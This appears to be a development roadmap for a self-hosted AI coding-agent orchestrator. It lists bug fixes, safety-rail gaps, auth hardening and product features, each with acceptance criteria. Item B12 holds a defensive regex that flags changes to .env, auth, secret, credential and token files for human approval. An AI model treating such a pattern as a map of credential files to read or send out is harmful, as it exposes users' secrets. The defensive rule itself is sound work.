### B8. Telegram messages with Markdown metacharacters silently fail — LOW — ✅ DONE (PR [#15](https://github.com/IngeniousArtist/hoopedorc/pull/15))

**Where:** `telegram.ts approvalRequested` sends `parse_mode: "Markdown"` with raw
task titles/messages. A title containing `_`, `*`, `[`, or a backtick makes the Bot
API reject the message → the approval never reaches the phone (the code logs and
moves on) → an unattended run stalls waiting for an approval the user never saw.

**Fix:** drop `parse_mode` entirely (plain text is fine for these) or escape
Telegram-Markdown metacharacters. Also have `approvalRequested` fall back to a
plain-text resend (no parse_mode) if the first send returns `ok: false` — `tg()`
currently swallows the error; make it return the error description so callers can
retry.

**Acceptance:** an approval whose title is `fix _foo_ [bar]` arrives on Telegram.

### B9. Tasks added mid-run are invisible to the running orchestrator — MEDIUM

**Where:** `Orchestrator.start` loads `tasks` once and loops over that array;
`plan/commit` on a running project writes new Task rows the loop never sees, and the
run "finishes" without them (they sit in `backlog` until the user manually presses
Start again — which currently they can, since the finished loop deregisters).

**Fix:** give the loop a refresh hook: add `getTasks?: () => Task[]` to
`SchedulerDeps` (`EngineRunner` supplies `() => repo.getTasks(db, project.id)`).
At the top of each `while` iteration, reconcile: append any DB task whose id isn't
in `currentTasks` (and adopt status changes for non-active tasks, replacing the
per-task `fresh` patch that exists today). Keep in-memory state authoritative for
tasks in `activeTaskIds`. This is also the foundation for the "add a task while it
runs" product feature (F3).

**Acceptance:** start a 2-task project, `plan/commit` a third task while the first
runs → the third dispatches without restarting the run.

### B10. Stale unresolved approvals survive restarts as zombie action-required items — LOW

**Where:** `EngineRunner.pendingApprovals` resolvers live in process memory. After a
restart, resume-on-boot re-runs tasks and creates **new** notifications, but the old
`requiresApproval` rows (with no `respondedWith`) remain; the Notifications page and
Telegram show dead Approve/Reject buttons whose `resolveApproval` returns false.

**Fix:** on boot (in `main()` before resume), mark all unresponded
approval-notifications as `respondedWith: "expired_restart"` (new repo helper,
one UPDATE), and have the UI render that as "expired". When
`resolveNotification` can't find a resolver, return an explicit "approval expired —
the task will re-request if still needed" message to the caller (HTTP 410 / Telegram
callback answer) instead of silently succeeding.

**Acceptance:** kill the server while an approval is pending; after restart the old
notification shows "expired" and responding to it returns the explicit message.

### B11. Gates pass vacuously on repos with no scripts — MEDIUM (safety rail gap)

**Where:** `gate-runner.ts runScript` uses `npm run <s> --if-present`, so a repo
with no `typecheck`/`lint`/`build`/`test` scripts passes every gate (exit 0). New
repos created by `createGithubRepo` are seeded with a script-less `package.json` —
i.e. **the default path for brand-new projects has zero objective gates**; only the
validator model stands between generated code and auto-merge.

**Fix (two parts):**
1. Surface it: `GateRunnerImpl.run` already returns per-gate `output` saying
   "unavailable" — add a `vacuous: boolean` to `GateResult.details` (types change)
   when *all four* script gates were missing, and have `canAutoMerge` treat a fully
   vacuous gate result as risky (escalate to approval) unless a new
   `settings.allowVacuousGates` (default false) is on. Show a warning banner on the
   Board when the last gate result was vacuous.
2. Fix the root for new repos: when the planner deconstructs a plan for a brand-new
   repo, the seeded scaffold task should add real `test`/`build` scripts — append a
   standing instruction to `DECONSTRUCT_SHAPE` in `planner.ts`: the first scaffold
   task must set up `package.json` scripts (`test`, `build`, `lint`, `typecheck`)
   appropriate to the stack it chooses, and its acceptance criteria must include
   "npm test runs real tests and passes".

**Acceptance:** a repo with no scripts + `hard_gate_flag_risky` policy → merge
requires approval with reason "no objective gates ran"; engine tests green.

### B12. Risky-file regex flags `author.ts`, `token.ts` etc. — LOW (noise) — ✅ DONE (PR [#16](https://github.com/IngeniousArtist/hoopedorc/pull/16))

**Where:** `orchestrator.ts canAutoMerge`:
`/\.env|auth|secret|credential|token/i.test(f)` matches substrings anywhere in the
path — `src/author.ts`, `docs/authors.md`, `tokenizer.ts` all trip the
"auth/secret change" rail and needlessly demote auto-merges to approvals (alert
fatigue → the user stops reading approvals).

**Fix:** match path *segments*, not substrings:
`/(^|\/)\.env(\.|$)|(^|\/)(auth|secrets?|credentials?|tokens?)(\/|\.|$)/i` — and add
unit tests in the engine test file for `author.ts` (no), `auth.ts` (yes),
`src/auth/login.ts` (yes), `tokenizer.ts` (no), `.env.local` (yes).

**Acceptance:** new unit tests pass; the four existing engine tests stay green.

### B13. `scopesOverlap` mishandles glob patterns — LOW — ✅ DONE (PR [#17](https://github.com/IngeniousArtist/hoopedorc/pull/17))

**Where:** `orchestrator.ts scopesOverlap` only strips a trailing `/**`; patterns
like `src/**/*.ts`, `**/*`, `*.md` fall through to literal string compares, so
tasks scoped `["**/*"]` (the planner's fallback and the stub tasks) are treated as
never overlapping anything — the serialization rail silently off for exactly the
least-scoped (riskiest) tasks.

**Fix:** normalize each pattern to its static prefix (everything before the first
glob char: `src/**/*.ts` → `src`, `**/*` → `""`), then apply the existing
prefix-overlap logic, where an empty prefix overlaps everything. Add engine unit
tests: `["**/*"]` vs anything → true; `["src/**/*.ts"]` vs `["src/utils/**"]` →
true; `["docs/**"]` vs `["src/**"]` → false.

**Acceptance:** new tests pass; a plan with two `**/*` tasks runs them serially.

### B14. Unbounded `logs` table growth — LOW — ✅ DONE (PR [#18](https://github.com/IngeniousArtist/hoopedorc/pull/18))

**Where:** every agent output line is persisted forever (`logs` table); a few long
runs → hundreds of MB in SQLite, slowing the WAL and snapshot queries.

**Fix:** prune on boot and daily (`setInterval` in `main()`): delete logs older
than `LOG_RETENTION_DAYS` (env, default 14) **and** keep at most the newest ~2000
rows per task (`DELETE FROM logs WHERE task_id = ? AND id NOT IN (SELECT id … ORDER
BY ts DESC LIMIT 2000)` per task with more). Add an index on `logs(task_id, ts)` in
`schema.sql` (B2 relies on it too).

**Acceptance:** boot with an old fat DB → row count drops; task log view (B2) still
shows recent history.

### B15. WS broadcasts every project's events to every client — LOW

**Where:** `ws-hub.ts broadcast` ignores `client.projectId`; subscription only
scopes the snapshot. With several projects running, every browser tab processes
every log line of every project (the Board filters client-side by taskId, so it's
waste + a subtle cross-project log-bleed in the LogPanel if task ids ever collide).

**Fix:** carry a `projectId` on `ServerEvent` payloads where missing (log events
need one — thread it through `EngineRunner.enqueueLog`; task/run/project events
already imply it) and have `broadcast` skip clients subscribed to a different
project (clients with no subscription get project-level events only:
`project.updated/deleted`). Keep `notification` events global (they're the "needs
you" channel).

**Acceptance:** two projects running, two tabs each subscribed to one → each tab's
WS frames only contain its own project's logs.

---

## Part 2 — Productization features (build after Part 1)

Vision reminder (from the user): not a SaaS — a robust self-hosted app for
developers who, like the owner, hold several model subscriptions and want to run a
team of coding agents in parallel: plan in chat, watch a kanban, let it run
autonomously, get pinged remotely, and step in mid-run without breaking things.

### F1. First-run onboarding wizard (highest product impact)

Today a new user lands on an empty Board with 9 nav tabs and no guidance. Turn the
existing SetupView into a guided first-run flow:

- On load, if there are no projects **and** setup has never completed, route to a
  `Welcome` page: step 1 shows the three CLI checks (`/api/setup`, already built)
  with fix-it hints per failure (install command, login command, copy-paste ready);
  step 2 model roster — read the user's actual `opencode models` output (new
  endpoint `GET /api/setup/models` shelling `opencode models`) and let them
  enable/disable + map the roster instead of hand-editing IDs blind; step 3 routing
  defaults with a one-line explanation of difficulty tiers and the
  author-vs-validator rule; step 4 (optional) budgets + Telegram; step 5 "Create
  your first project" → existing NewProject.
- Persist `settings.onboardedAt`. Add "Re-run setup" link on SetupView.
- Files: new `apps/web/src/pages/Welcome.tsx`, `App.tsx` routing, `setup.ts`
  (+models endpoint), types.

### F2. Task detail drawer (make the black box explainable)

The Board's selected-task strip is cramped and hides the decision trail. Add a
right-side drawer (click a card) with tabs:

- **Overview**: description, acceptance criteria (checkable display), scope paths,
  model + fallback chain, attempts timeline (one row per run: model, duration —
  needs B4 — cost, exit reason).
- **Logs**: the existing live log panel + history (needs B2), with source filter
  (engine/agent/gate/validator) and auto-follow toggle.
- **Review**: latest `GateResult` as pass/fail chips with expandable output,
  validator verdicts with reasons + confidence (from `merge_decisions` — add
  `GET /api/tasks/:id/decisions`, repo fn exists).
- **PR**: diff viewer (exists), PR link, rollback/retry buttons (exist).
- Files: new `apps/web/src/components/TaskDrawer.tsx`, Board refactor, one new
  route + types entry.

### F3. Mid-run control (the user explicitly wants this)

With B1/B3/B9 done, expose real mid-run intervention in the UI:

- **Stop this task** button on running cards (B1), with a confirm.
- **Add a task while running**: a "+ Add task" affordance on the Board (title,
  description, difficulty, scope, deps picker) → `POST /api/projects/:id/tasks`
  (new route, materialize a single task) → picked up live via B9.
- **Reprioritize**: drag between Backlog/Ready columns → PATCH status (B5 rules).
- **Pause modes**: split Pause into "Pause (finish current tasks)" — set
  `paused` but let active tasks complete (new orchestrator flag `drain`) — and
  "Stop now" (current abort behavior). Two buttons in ProjectHeader.
- Files: orchestrator (drain flag), engine-runner, index.ts (add-task route),
  Board/ProjectHeader, types.

### F4. Live "mission control" strip on the Board

The user wants to glance and know what the team is doing. Add a slim strip above
the columns: one row per **active agent** (model avatar, task title, elapsed time,
last-activity heartbeat — the activity map already exists in Board.tsx), plus
project burn: spend so far vs budget with a thin progress bar (data already in
`costAnalytics`), and count of pending approvals (deep-link to Notifications).
Files: new `apps/web/src/components/MissionControl.tsx`, Board.

### F5. Notifications that reach the user (not just a tab)

- **Browser notifications** (Notification API) for `action_required` and task
  failures when the tab is hidden; permission requested from Settings.
- **Approval deep links**: Telegram approval messages should include the PR URL
  and top validator reasons (data exists on the notification/decision) so the user
  can decide from the phone without opening the app.
- **Digest setting**: `settings.telegram.digest: "off" | "terminal" | "all"` —
  "terminal" (default) pushes only done/failed/approval; "all" adds per-attempt
  progress. Wire in `EngineRunner.onTaskUpdated`/`taskStatus`.
- Files: `useToast`-style `useBrowserNotify` hook, telegram.ts, engine-runner,
  Settings page, types.

### F6. Model health + subscription awareness

For the multi-subscription audience, per-model observability:

- **Health panel** on SetupView: last `testModels` result per model (persist
  results to a small `model_checks` table with ts), rolling failure rate from
  `runs` (exit_reason error/stuck per model), median run duration.
- **Rate-limit cooldown**: when an adapter failure looks like a rate limit
  (`/rate.?limit|429|too many requests|quota/i` on the summary), mark the model
  "cooling down" in-memory for N minutes (EngineRunner map) and have the
  orchestrator's dispatch skip it (treat like budget-blocked, log once) so the
  fallback chain routes around it instead of burning attempts.
- Files: adapters (classify exitReason `rate_limited`), orchestrator (skip set),
  engine-runner, setup.ts, SetupView, types.

### F7. Cost guardrails short of the hard stop

Budget today is a cliff (checkBudget → refuse). Add soft rails:

- Warning notifications at 50% / 80% of project budget and global monthly budget
  (emit once per threshold — track in a `budget_alerts` table or settings JSON),
  pushed via WS + Telegram.
- Board budget bar turns amber/red at the thresholds (data exists in analytics).
- Per-task estimate chip on Ready cards ("~$0.03") using the existing
  `getModelRunAverages`.
- Files: budget.ts (threshold helper), engine-runner (check after each cost
  record), CostView/Board, types.

### F8. Autonomous-run report card

When a run ends (the `finally` in `EngineRunner.start`), generate a **run
summary**: tasks done/failed, total cost, duration, PRs merged (links), approvals
that were required, and the top failure reasons — persist as an `audit_log` entry
(kind `run_summary`) and send it to Telegram (the `info` push exists but is one
line — make it the digest). Render past run summaries at the top of AuditView.
This is the "get updates" feature for away-from-keyboard autonomy. Optional
(behind a toggle): pipe the summary through the `updates`-role model (Grok) for a
natural-language paragraph — but the mechanical digest must not depend on a model.
Files: engine-runner, repo (audit query by kind), AuditView, telegram.

### F9. Project templates & per-project gate config

- Per-project overrides (new `projects.config` JSON column): gate script names
  (which npm scripts count as gates — the P2 roadmap item; repos vary),
  `maxAttempts`, merge policy override, and a "test command" free-field for
  non-npm stacks (run via execFile with args split, no shell).
- `GateRunnerImpl` reads the override through a new `SchedulerDeps.gateConfig`.
- NewProject gains an "Advanced" accordion for these; sensible defaults unchanged.
- Files: types, schema (+migration in db/index.ts), gate-runner, engine-runner,
  NewProject/ProjectHeader.

### F10. Ship it like a product: packaging & deployment

- **Serve the built web app from the server** (the Round-3 note in
  ARCHITECTURE.md): `@fastify/static` on `apps/web/dist` when it exists;
  `npm run start` = build all + run server; then one port, no CORS in prod (S2).
- **Single-command run**: root scripts `npm run start` (prod) and `npm run setup`
  (interactive: create `.env`, run setup checks in terminal). A `bin` entry
  (`hoopedorc` CLI: `start|init`) so `npx`/global install works.
- **systemd unit + Dockerfile** in `deploy/` (Docker mounts the repos dir, the
  DB, and the user's `~/.config` for gh/claude/opencode auth — document the
  caveats; native + systemd is the primary path since the CLIs need auth).
- **Versioning**: keep a real CHANGELOG.md for the orchestrator itself; tag
  releases.
- Files: server (static serving), package.json(s), deploy/, README.

### F11. Docs for other users

README today is contributor-oriented. Add `docs/USER_GUIDE.md`: what it is (3
paragraphs), install + prerequisites (subscriptions needed per model, opencode
auth walkthrough), first project tutorial (plan chat → review table → start →
watch board → approval on Telegram), the safety model (gates, validator,
risky-change rules, budgets, rollback), remote setup (Tailscale + HOST +
API_TOKEN from S2), and a troubleshooting table built from the real failure modes
in NEXT_STEPS.md (PWD bug symptoms, opencode lock collisions, vacuous gates…).
Link it from the README and the app's Setup page.

### F12. Multi-project run queue — LOW priority

`engine.orchestrators` already supports concurrent projects, but they compete for
the same models (per-model `maxConcurrent` is enforced per-orchestrator, not
globally — two projects can each run 2 deepseek-flash tasks). Move
`modelActiveCount` up to a shared registry in `EngineRunner` passed via deps so
per-model caps hold across projects. UI: Projects page shows per-project
running/paused status with start/pause inline (mostly exists).

### F13. Sandbox mode for agents & gates — FUTURE (note only, don't build now)

The honest security posture (S5, B11) is "agents and repo scripts execute on the
host". A `SANDBOX=container` mode running each worktree's agent + gates inside a
disposable container (repo mounted, no host env, network-restricted) is the real
fix. Requires the CLIs authenticated inside the image — significant work; design
doc first (`docs/specs/sandbox.md`), do not attempt as part of this pass.
**F18 wrote that design doc** — see [`docs/specs/sandbox.md`](specs/sandbox.md)
for goals/non-goals, the container-auth problem, worktree mount model, network
policy, env sanitization, gates-in-container, and the phased rollout. Still no
implementation — F13 itself remains future work.

---

## Part 3 — Review-pass fixes & next features (Fable audit, 2026-07-05)

Produced by independently auditing the merged Phase 6 code (PRs #37–#40) plus
the surrounding areas it touches — every "Problem" below was confirmed against
the actual code on `main` at `v0.1.0`, not inferred from the progress notes.

**Workflow (same as Parts 1–2, plus):**
- One branch/PR per item (or a small coherent batch), item IDs in commit
  messages, update the Phase 7/8 tables in the Progress section as you land.
- Verification bar is unchanged: typecheck/build/engine+adapter tests green,
  and live verification against a real (non-mock) server for anything with a
  runtime surface. **Put the verification evidence in the PR description** —
  Fable re-verifies each item after merge and will use those as the checklist.
- For browser verification: the Chrome extension tool has TWO connected
  browsers on this account. Call `list_connected_browsers` first and select
  the **macOS one marked `isLocal: true`** ("Browser 1") — the other is a
  remote Windows browser that cannot reach this Mac's localhost and produces
  misleading "Frame with ID 0 is showing error page" errors on every call.

### B16. Dockerfile build stage certainly fails — HIGH (broken artifact)

**Where:** `deploy/Dockerfile` lines 8–12.

**Problem:** every workspace `tsconfig.json` (all five: types, adapters,
engine, server, web) contains `"extends": "../../tsconfig.base.json"`, but the
build stage only copies `package*.json`, `packages/`, and `apps/` — so
`RUN npm run build` fails on the missing base tsconfig. Separately, the root
`package.json` declares `"bin": { "hoopedorc": "./bin/hoopedorc.mjs" }` and a
`setup` script pointing at `scripts/init.mjs`; neither `bin/` nor `scripts/`
is copied, and `npm ci` errors (ENOENT) when linking a declared bin whose file
doesn't exist — so even the install step is at risk, not just the build. This
was shipped labeled "unverified reference" but it is *deterministically*
broken, which is worse than unverified.

**Fix:** in the build stage, before `RUN npm ci`, add:
```dockerfile
COPY tsconfig.base.json ./
COPY bin ./bin
COPY scripts ./scripts
```

**Acceptance (no Docker daemon on this machine — simulate the build context):**
copy *exactly* the paths the Dockerfile COPYs (after the fix) into a fresh temp
dir — `package.json`, `package-lock.json`, `tsconfig.base.json`, `bin/`,
`scripts/`, `packages/`, `apps/` and nothing else (no root `node_modules`, no
`.env`, no `docs/`) — then run `npm ci && npm run build` inside it. Both must
succeed. Delete the temp dir after.

### B17. A configured-but-missing gate script silently passes — HIGH (safety rail gap)

**Where:** `packages/engine/src/gate-runner.ts` — `runGate()` (~line 55) and
the `gates?.testScript` string branch of `runTestsGate()` (~line 76).

**Problem:** F9's override plumbing routes `runGate(cwd, slot, override)` →
`runScript(cwd, override || slot)`, and `runScript` returns
`{ passed: true, ran: false }` when `hasNpmScript()` doesn't find the script.
That behavior is *correct* for the default slot names (it's the B11 vacuous
mechanism: repo simply has no "lint" script → nothing to run → vacuous check
catches the aggregate). But an **explicitly configured** override that names a
missing script — a typo (`"tc:strict"` vs `"tc-strict"`), or the repo renaming
its scripts later — silently passes the gate with `ran: false`, and the
vacuous check only fires if *all four* gates ran nothing. Contrast:
`testCommand` already fails loudly when its command doesn't exist, with a
comment explaining exactly this reasoning ("explicitly configured by the
operator, so any failure … is a real gate failure"). The same rule must apply
to explicit script-name overrides.

**Fix:**
1. In `runGate()`: when `typeof scriptOverride === "string"` and
   `!hasNpmScript(cwd, scriptOverride)` → return
   `{ passed: false, ran: true, output: 'configured gate script "<name>" not found in package.json' }`.
2. Same guard in `runTestsGate()`'s `gates?.testScript` string branch before
   it calls `runScript`.
3. **Do NOT touch the default-slot path.** A missing *default* script
   ("typecheck"/"lint"/"build"/"test"/"tests" with no override) must keep
   returning `{ passed: true, ran: false }` — that is the vacuous-gate
   machinery and existing tests depend on it.

**Acceptance:** new unit tests in `gate-runner.test.ts`: (a) override →
missing script fails the gate with "not found" in the output; (b) testScript
override → missing script fails the tests gate; (c) the existing default-slot
tests (missing default scripts pass with `ran: false`, vacuous aggregate) stay
green untouched.

### B18. A capacity-blocked project waits in total silence — MEDIUM (observability)

**Where:** `packages/engine/src/orchestrator.ts` — the
`active >= cfg.maxConcurrent` skip (~line 362) that F12 gave the
`blockedByCapacity` flag.

**Problem:** budget blocks and cooldown blocks each emit a warn-once log
(`budgetBlockedWarned` / `cooldownBlockedWarned`); the capacity skip emits
nothing. Post-F12 the cap is global, so a project can now sit polling at 250ms
for *minutes* waiting on another project's model slot with zero log lines —
on the Board it is indistinguishable from a hang.

**Fix:** mirror the existing pattern exactly: add
`private readonly capacityBlockedWarned = new Set<string>();`, clear it in
`start()` alongside the other two `.clear()` calls, emit warn-once
(`"Model at capacity (in use by another task or project), holding: <model>"`,
level `"warn"`, source `"engine"`, with the task id) when the capacity skip
fires, and `capacityBlockedWarned.delete(task.id)` on the dispatch path right
where the budget/cooldown warned-sets are deleted.

**Acceptance:** unit test: shared-registry deps hooks pre-loaded at the cap →
loop runs several passes → exactly one capacity warn log for the task; then
`decModelActive` mid-test → task dispatches and completes.

### B19. Manual dispatch is invisible to the global model cap — MEDIUM

**Where:** `packages/engine/src/orchestrator.ts` `runTask()` (~line 472);
stale doc-comment on `manualRuns` in `packages/server/src/engine-runner.ts`.

**Problem:** `runTask` (the `/dispatch` path) never calls
`incModel`/`decModel`, so a manually-dispatched task doesn't count toward the
shared F12 registry — an autonomous loop will happily dispatch `maxConcurrent`
*more* copies of the same model on top of it. The F12 PR documented this as
intentional; on reflection it's half-right: a manual dispatch *shouldn't be
blocked* by the cap (an explicit human action must not silently queue), but it
*must be visible* to everyone else's capacity accounting.

**Fix:** in `runTask`, before `executeTask`:
`this.incModel(task.assignedModel); this.runningModel.set(task.id, task.assignedModel);`
— and in the `finally`, replicate `start()`'s dispatch-finally exactly
(fallback escalation can switch the model mid-run, so decrement
`this.runningModel.get(task.id) ?? task.assignedModel`, then delete from
`runningModel` and `activeTaskIds`). Do **not** add a capacity *check* to
`runTask` — count it, don't block it. Update the `manualRuns` doc-comment in
`engine-runner.ts`, which currently states manual runs "never contribute to
that count" — after this fix they do.

**Known-and-accepted (do not "fix", just leave this note):** fallback
escalation (`switchRunningModel`) increments the next model without checking
its cap — a task already in flight escalating to a busy model may transiently
exceed the cap. Blocking mid-task on capacity would risk deadlock; the
transient overshoot is the lesser evil.

**Acceptance:** unit test: `runTask` holds model X (blocking adapter,
`maxConcurrent: 1`, shared registry hooks) → a second Orchestrator's `start()`
with a ready task on X does not author until the manual run resolves; both
finish `done`.

### S6. Auth polish: real login screen, constant-time compare, doc note — MEDIUM

**Where:** `apps/web/src/api/client.ts` (~line 71: `window.prompt`),
`packages/server/src/index.ts` auth hook (~line 560: `bearer !== token`),
`docs/USER_GUIDE.md` (Remote setup section).

**Problem:** three leftovers. (1) The `window.prompt()` token entry was
explicitly flagged back in S2's notes as a stopgap "F1 should replace" — F1
never did. (2) The bearer comparison uses `!==`, not a constant-time compare
(low risk behind Tailscale, but it's a one-liner to do right). (3) When
`API_TOKEN` is set, the SPA shell + JS assets are still served without auth
(only `/api/*` and `/ws` are guarded) — this is *by design* (the shell
contains no data) but is documented nowhere.

**Fix:**
1. **Login screen.** New `apps/web/src/components/TokenGate.tsx`: a small
   centered card (token password-input, error line, submit) in the app's
   existing dark style. `client.ts`: replace the `window.prompt` block with a
   registered handler — `export function setUnauthorizedHandler(h: () => Promise<string | null>)`;
   on 401, `await` the handler, store the token (same localStorage key,
   `"hoopedorc.apiToken"`), retry once; a second 401 after retry surfaces as a
   normal error (the handler shows it and re-asks on the next call). `App.tsx`
   registers a handler that renders TokenGate and resolves with the entered
   token. **Constraints:** (a) when auth is off — the default — nothing may
   render or flash: TokenGate appears only after a real 401; (b) no WS changes
   needed — `useWS` already reads `getStoredApiToken()` on every reconnect
   attempt and backoff-retries, so it picks up the new token by itself
   (verify this during live-testing, don't re-implement it); (c) after this,
   `grep -r "window.prompt" apps/web/src` must return nothing.
2. **Constant-time compare.** In the server auth hook, compare via
   `node:crypto`'s `timingSafeEqual` on UTF-8 buffers with a length guard
   (length mismatch → reject without calling timingSafeEqual, which throws on
   unequal lengths). Apply to both the bearer header and the `?token=` query
   param paths.
3. **Docs.** One short paragraph in USER_GUIDE's Remote setup: the app shell
   itself is served without a token; all data still requires one.

**Acceptance:** live-verified in a real browser against a real server booted
with `API_TOKEN=...`: first load shows the in-app TokenGate (no browser
prompt); wrong token → inline error, stays on the gate; correct token → app
loads fully *including live WS events* (start a project or trigger any WS
event to prove the socket authenticated); with auth off, the gate never
appears. Typecheck/build green.

### F14. CI for this repo — GitHub Actions (highest leverage, do first in Phase 8)

The repo has **zero CI** — every "green" claim in Phases 1–6 was a local run.
Ironic, given the product's premise is enforcing gates.

- New `.github/workflows/ci.yml`: trigger on `pull_request` and on `push` to
  `main`. Single job on `ubuntu-latest`: `actions/checkout@v4`,
  `actions/setup-node@v4` with `node-version: 22` and `cache: npm`, then
  `npm ci`, `npm run typecheck`, `npm run build`, `npm test -w @orc/engine`,
  `npm test -w @orc/adapters`. No secrets are needed (nothing in the test
  suites touches a real model or GitHub).
- Do **not** add a Docker build step (B16 makes the Dockerfile buildable in
  principle, but there's no need to spend CI minutes proving it every PR).
- Note: engine tests spawn real `npm`/`git` subprocesses (gate-runner tests
  create temp repos) — both exist on ubuntu-latest runners; no extra setup.

**Acceptance:** the workflow runs green on its own PR (visible via
`gh pr checks`). After merge, `main` shows a green check.

### F15. "Wait for GitHub checks" merge gate (old P2 roadmap item)

Local gates can't see the target repo's own CI. Add an **opt-in, per-project**
gate that holds an auto-merge until the PR's GitHub checks pass.

- **Types:** `ProjectConfig` gains `requireGithubChecks?: boolean` and
  `githubChecksTimeoutMin?: number` (default 15). Extend `parseProjectConfig`
  in `packages/server/src/index.ts` (boolean; integer 1–120) and the
  `ProjectConfigFields` Advanced accordion (checkbox + number input). Update
  CONTRACT.md's ProjectConfig paragraph.
- **Engine:** `GitService` gains
  `waitForChecks(project, prNumber, timeoutMs): Promise<"passed" | "failed" | "none" | "timeout">`,
  implemented in `git-service.ts` with `gh pr checks <n> --repo <owner/repo>`
  polled every ~15s (execFile arg arrays, as everywhere else in that file).
  **Before writing it, verify the installed `gh`'s actual behavior by hand**
  (`gh pr checks --help`, and run it against a real PR): exit 0 = all checks
  passed; non-zero = failing OR still pending (parse stdout to tell them
  apart); and the no-checks-configured case prints a distinctive
  "no checks reported" style message — map that to `"none"`. Do not trust
  this paragraph over the real CLI: check first, as B7/F9 did.
- **Orchestrator:** in `executeTask`, after the validator approves and before
  the merge (near the `canAutoMerge` call, ~line 856): if
  `project.config?.requireGithubChecks`, await `waitForChecks`. `"passed"` /
  `"none"` → proceed. `"failed"` / `"timeout"` → do NOT merge; route into the
  existing `requestApproval` escalation with the reason ("GitHub checks
  failed" / "timed out after Nmin") so a human decides. **While polling, emit
  an info log line per poll** ("Waiting for GitHub checks (Xm)…") — the stuck-
  task detector watches log activity, and a silent multi-minute wait would
  trip it (verify against `STUCK_DETECTION` in orchestrator.ts).
- Also honor B1: check `bailIfStopRequested` after the wait returns.

**Acceptance:** engine unit test with a fake GitService covering all four
outcomes (merge proceeds on passed/none; escalates on failed/timeout; nothing
merges after a Stop during the wait). Live verification: optional but ideal —
one run against the throwaway repo with a trivial always-pass workflow.

### F16. Subscription quota awareness (the multi-subscription feature)

Rate-limit cooldowns (F6) react *after* a model starts failing. Subscriptions
have known windows — Claude Pro's usage caps being the motivating case — so
let the operator declare them and route around exhaustion *before* burning
attempts.

- **Types:** `ModelConfig` gains
  `quota?: { windowHours: number; maxRuns?: number; maxCostUsd?: number }`
  (at least one of maxRuns/maxCostUsd must be set for the quota to mean
  anything — validate on settings save). CONTRACT.md note.
- **Server:** `EngineRunner.checkModelQuota(modelId): string | null` — if the
  model's config has a quota, count its runs (`runs` table, `started_at >=`
  now − window) and sum its cost (`costs` table, same window) **across all
  projects**, and return a reason string when either limit is met.
- **Engine:** new optional `SchedulerDeps.checkModelQuota?` hook. Consult it
  in **both** places `checkBudget` is consulted (the dispatch loop ~line 319
  AND the retry/attempt path ~line 502) with identical skip-don't-fail,
  warn-once semantics — new `quotaBlockedWarned` set following the exact
  budget/cooldown pattern (including B18's `.clear()` in `start()` and
  `.delete()` on dispatch).
- **UI:** three small inputs in Settings' ModelsEditor per model (window
  hours, max runs, max cost). Skip dashboards for now; enforcement first.
  (Optional nice-to-have: show "N runs / $X used this window" in SetupView's
  model-health panel — only if cheap.)

**Acceptance:** engine unit test (hook returns a reason → task skipped, warn
logged once, dispatches after the hook returns null). Server-side standalone
script (the established `as any` pattern against a real in-memory SQLite DB):
seed runs/costs rows inside and outside the window, assert the window math —
runs-limit, cost-limit, and no-quota-configured cases.

### F17. DB backup rotation

`deploy/README.md` says "back it up"; nothing does.

- New `packages/server/src/db/backup.ts`: `runBackup(db, dbPath)` — skip
  entirely when the DB is in-memory (`:memory:`) or `ENV.mock`; otherwise use
  better-sqlite3's built-in online backup API (`db.backup(destPath)`, returns
  a promise — **check the installed version's API signature** in
  `node_modules/better-sqlite3/lib` before writing) into
  `DB_BACKUP_DIR` (env; default: `<dirname(dbPath)>/backups/`), filename
  `hoopedorc-YYYY-MM-DD-HHmm.db`; `mkdir -p` the dir; prune to the newest
  `DB_BACKUP_KEEP` (env, default 7).
- Wire in `main()` next to the log-prune scheduling: run on boot + every 24h
  (`setInterval(...).unref()`), try/catch with a warn log — a failed backup
  must never crash the server.
- Add the two env vars to `.env.example` + ENV in `config.ts`.

**Acceptance:** boot with a file DB → a backup file appears with today's
timestamp; pre-seed 9 dummy older backup files → pruned to 7 (newest kept);
mock/in-memory boot creates nothing.

### F18. Sandbox design doc — docs only, no code

Write `docs/specs/sandbox.md` fleshing out F13: goals/non-goals, the
authenticated-CLIs-inside-a-container problem (incl. the F10 finding that
Claude Code's login lives in the macOS Keychain → `ANTHROPIC_API_KEY` is the
only container path and bills differently), worktree mount model, network
policy, env sanitization inside vs outside, gates in-container, and a phased
rollout (gates-only sandbox first, agents later). Link it from F13's entry
above and from the README security section. **No implementation.**

### F19. Scheduled runs — IN SCOPE (user opted in 2026-07-06, after Phase 7)

Cron-style "start project X every night" for maintenance tasks. Do after
F14–F17 (needs CI to trust it, and should respect the quota/backup rails
those add). Design: a small `schedule` field on `Project` (or a new table if
multiple schedules per project end up wanted) holding a simple recurrence —
prefer a deliberately dumb interval/time-of-day scheduler over pulling in a
cron-parse dependency unless real cron syntax turns out to be worth the
weight (decide once the shape is clearer). A `setInterval` check (mirroring
the existing log-prune/backup boot+interval pattern in `main()`) compares
current time against each project's next-due time and calls the existing
`EngineRunner.start(project)` path — no new dispatch mechanism, just a timer
that triggers the same button the UI's Start does. Surface it in
`ProjectConfigFields`/`ProjectHeader` (enable + a simple "every day at HH:MM"
or "every N hours" control) alongside F9's other per-project config.

---

## Part 4 — Post-plan audit & UX wave (Fable, 2026-07-06)

Two halves. First, the **audit record** for the merged Phase 7/8 work:
item-level acceptance criteria all held up and CI stayed green, but three
cross-cutting integration defects were found and fixed the same day
(PR [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57)) — they're
recorded as A1–A3 below so the reasoning isn't lost. Second, the **UX
wave**: findings from driving every page of the real app (mock server, real
browser, desktop and phone widths), specced as U1–U10 for Sonnet to
implement top-down. Same ground rules as Parts 1–3 — branch → PR → merge,
CI (F14) green on every PR, verification evidence in PR descriptions,
live-verify anything with a runtime surface. Note the standing rule from
the top of this doc: UI work is live-verified in a real browser (the
`agent-browser` pattern used since Phase 4), not just typechecked.

### A1–A5. Audit record (already fixed — do not re-implement)

- **A1 (PR #57)** — `apps/web/src/api/client.ts`: a fresh page load against
  a token-requiring server fires several `api()` calls at once; each 401
  invoked the TokenGate handler separately, and since `App.tsx` keeps a
  single resolver, each invocation clobbered the previous caller's —
  leaving every earlier call hanging forever (e.g. `listProjects` losing
  the race left the project dropdown on "No projects"). Fixed by sharing
  one in-flight handler promise across all concurrent 401s.
- **A2 (PR #57)** — `checkSchedules` (`packages/server/src/index.ts`) never
  set the project status to `"running"` nor broadcast `project.updated`
  (the `/start` route does both), so a scheduled run showed a stale status
  for its whole duration. Fixed by mirroring the route on successful
  kickoff.
- **A3 (PR #57)** — `isScheduleDue` daily mode required the *exact* HH:MM
